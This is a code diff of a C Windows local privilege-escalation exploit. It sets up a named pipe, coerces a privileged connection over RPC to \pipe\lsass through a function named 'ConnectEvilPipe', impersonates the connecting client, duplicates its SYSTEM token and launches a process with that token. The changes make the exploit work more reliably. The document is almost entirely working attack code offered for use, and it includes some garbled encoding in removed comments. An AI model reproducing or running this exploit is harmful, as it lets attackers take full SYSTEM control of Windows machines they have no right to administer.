@@ -1,18 +1,20 @@
-#include "service2system.h"
+ï»¿#include "service2system.h"
 
 
 extern LPWSTR g_pwszCommandLine;
+extern HANDLE hSystemToken;
 
 void GetSystemAsImpersonatedUser(HANDLE hToken)
 {
 	DWORD dwCreationFlags = 0;
 	PROCESS_INFORMATION pi = { 0 };
 	STARTUPINFO si = { 0 };
-	pfn_NtSetInformationProcess NtSetInformationProcess;
-	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
-	NtSetInformationProcess = (pfn_NtSetInformationProcess)GetProcAddress(hNtDll, "NtSetInformationProcess");
-	_PROCESS_ACCESS_TOKEN AccessToken = { 0 };
+	LPWSTR pwszCurrentDirectory = NULL;
 
+	LPVOID lpEnvironment = NULL;
+	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
+	
+	// WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
 	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
 	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
 	{
@@ -25,11 +27,13 @@ void GetSystemAsImpersonatedUser(HANDLE hToken)
 	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
 	dwCreationFlags |= CREATE_NEW_CONSOLE;
 
-	
+
 	ZeroMemory(&si, sizeof(STARTUPINFO));
-	si.cb = sizeof(STARTUPINFO);
 	
-	if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, NULL, NULL, &si, &pi))
+	si.cb = sizeof(STARTUPINFO);
+	si.lpDesktop = (LPWSTR)L"WinSta0\\default";
+
+	if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
 	{
 		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
 		goto cleanup;
@@ -37,24 +41,25 @@ void GetSystemAsImpersonatedUser(HANDLE hToken)
 	else
 	{
 		wprintf(L"[+] CreateProcessWithTokenW() OK\n");
+		return;
 	}
+
 	
-	 /*AccessToken.Token = hSystemTokenDup;
-	 AccessToken.Thread = GetCurrentThread();
-	 NtSetInformationProcess(GetCurrentProcess(),ProcessAccessToken,&AccessToken,sizeof(AccessToken));
-	
-	 //WinExec("calc.exe", FALSE);*/
+	/*AccessToken.Token = hSystemTokenDup;
+	AccessToken.Thread = GetCurrentThread();
+	NtSetInformationProcess(GetCurrentProcess(),ProcessAccessToken,&AccessToken,sizeof(AccessToken));
+
+	//WinExec("calc.exe", FALSE);*/
 
 cleanup:
 	if (hToken)
 		CloseHandle(hToken);
 	if (hSystemTokenDup)
-		CloseHandle(hSystemTokenDup);	
+		CloseHandle(hSystemTokenDup);
 	if (pi.hProcess)
 		CloseHandle(pi.hProcess);
 	if (pi.hThread)
 		CloseHandle(pi.hThread);
-
 	return;
 }
 
@@ -71,8 +76,6 @@ void StartNamedPipeAndGetSystem()
 	pwszPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
 	StringCchPrintf(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\random\\pipe\\srvsvc");
 
-
-
 	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
 	{
 		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
@@ -88,24 +91,22 @@ void StartNamedPipeAndGetSystem()
 	if ((hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
 	{
 		wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
-		if (ConnectNamedPipe(hPipe, NULL)) {
+		
+		if (ConnectNamedPipe(hPipe, NULL) > 0) {
 			wprintf(L"[+] A client connected!\n");
-		}
-		else {
-			wprintf(L"[-] Do Not Connect!\n");
-			CloseHandle(hPipe);
-			return;
-		}
-
-		if (ImpersonateNamedPipeClient(hPipe)) {
-			if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
-				GetSystemAsImpersonatedUser(hToken);
-				CloseHandle(hPipe);
+			if (ImpersonateNamedPipeClient(hPipe)) {
+				if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
+					
+					GetSystemAsImpersonatedUser(hToken);
+					CloseHandle(hPipe);
+					
+				}
 			}
-		}
-		else {
-			printf("CreateNamedPipe error\n");
-			CloseHandle(hPipe);
+			else {
+				printf("CreateNamedPipe error\n");
+				CloseHandle(hPipe);
+				return;
+			}
 		}
 		return;
 	}
@@ -120,20 +121,20 @@ void ConnectEvilPipe()
 	status = RpcStringBindingCompose(
 		NULL,
 		(RPC_WSTR)L"ncacn_np",
-		(RPC_WSTR)L"\\\\127.0.0.1",//ÕâÀïÈ¡NULLÒ²ÄÜ´ú±í±¾µØÁ¬½Ó
+		(RPC_WSTR)L"\\\\127.0.0.1",
 		(RPC_WSTR)L"\\pipe\\lsass",
 		NULL,
 		&pszStringBinding
 	);
 	wprintf(L"[+]RpcStringBindingCompose status: %d\n", status);
-	
-	//°ó¶¨½Ó¿Ú
+
+
 	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
 	wprintf(L"[+]RpcBindingFromStringBinding status: %d\n", status);
 
-	//ÊÍ·Å×ÊÔ´
+
 	status = RpcStringFree(&pszStringBinding);
-	wprintf(L"RpcStringFree code:%d\n", status);
+	wprintf(L"[+] RpcStringFree code:%d\n", status);
 	RpcTryExcept{
 		PVOID pContent;
 		LPWSTR pwszFileName;
@@ -148,7 +149,7 @@ void ConnectEvilPipe()
 			pwszFileName,
 			0
 		);
-		wprintf(L"[*] Error: %ld\r\n", result);
+		// wprintf(L"[*] Error: %ld\r\n", result);
 		status = RpcBindingFree(
 			&BindingHandle                   // Reference to the opened binding handle
 		);
